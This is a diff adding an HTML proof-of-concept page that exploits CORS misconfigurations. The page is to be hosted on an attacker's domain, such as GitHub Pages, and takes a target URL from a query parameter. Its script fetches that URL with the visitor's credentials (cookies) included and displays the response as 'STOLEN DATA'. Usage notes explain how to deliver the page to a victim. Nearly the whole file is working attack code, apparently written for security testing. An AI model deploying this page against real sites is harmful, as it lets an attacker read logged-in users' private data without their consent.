@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dynamic CORS PoC - Attacker Origin</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f4f4f9; }
+        .container { background-color: #ffffff; padding: 25px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); }
+        h1 { color: #cc0000; }
+        pre { background-color: #eee; padding: 15px; border: 1px solid #ccc; white-space: pre-wrap; word-wrap: break-word; }
+        .note { margin-top: 20px; padding: 10px; background-color: #e6f7ff; border-left: 5px solid #007bff; color: #004085; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Dynamic CORS Misconfiguration Proof of Concept (PoC)</h1>
+        <p><strong>Origin:</strong> This page is hosted on the attacker-controlled domain (your GitHub Pages).</p>
+        <p><strong>Goal:</strong> Attempting to fetch authenticated sensitive data from: <code id="target-url-display">N/A</code></p>
+
+        <div class="note">
+            <strong>Usage:</strong> The target URL is dynamically extracted from the `target` parameter in the URL you use to deliver this PoC.
+            <br>
+            <strong>Example PoC URL:</strong> <code>https://yourusername.github.io/cors_test.html?target=https://vulnerable-target.com/api/user-data</code>
+        </div>
+
+        <h2>Request Status & Result</h2>
+        <pre id="result">Waiting for target URL to be defined in URL parameters...</pre>
+
+        <script>
+            // 1. Get the URL parameters
+            const urlParams = new URLSearchParams(window.location.search);
+            // 2. Extract the value of the 'target' parameter
+            const TARGET_URL = urlParams.get('target');
+            
+            // Check if the target URL was provided
+            if (!TARGET_URL) {
+                document.getElementById('result').textContent = "ERROR: No target URL specified. Please add a '?target=...' parameter to the URL.";
+            } else {
+                document.getElementById('target-url-display').textContent = TARGET_URL;
+                document.getElementById('result').textContent = `Attempting cross-origin fetch from ${TARGET_URL}...`;
+
+                fetch(TARGET_URL, {
+                    // 'credentials: "include"' is mandatory for testing authenticated CORS misconfigurations
+                    credentials: 'include' 
+                })
+                .then(response => {
+                    if (response.ok) {
+                        return response.text();
+                    } else {
+                        throw new Error(`HTTP Status ${response.status}: ${response.statusText || 'Request Blocked'}`);
+                    }
+                })
+                .then(data => {
+                    document.getElementById('result').innerHTML = 
+                        "<strong>[SUCCESS]</strong> Data successfully read by attacker's origin! This confirms a read-access CORS misconfiguration.<br><br><strong>STOLEN DATA:</strong><br>" + data;
+                })
+                .catch(error => {
+                    document.getElementById('result').innerHTML = `
+                        <strong>[FAILURE/BLOCKED]</strong> Could not read the response.<br><br>
+                        <strong>Details:</strong> ${error.message}<br><br>
+                        Note: A successful CORS defense will block the attacker's script from reading the response body.
+                    `;
+                });
+            }
+        </script>
+    </div>
+</body>
+</html>
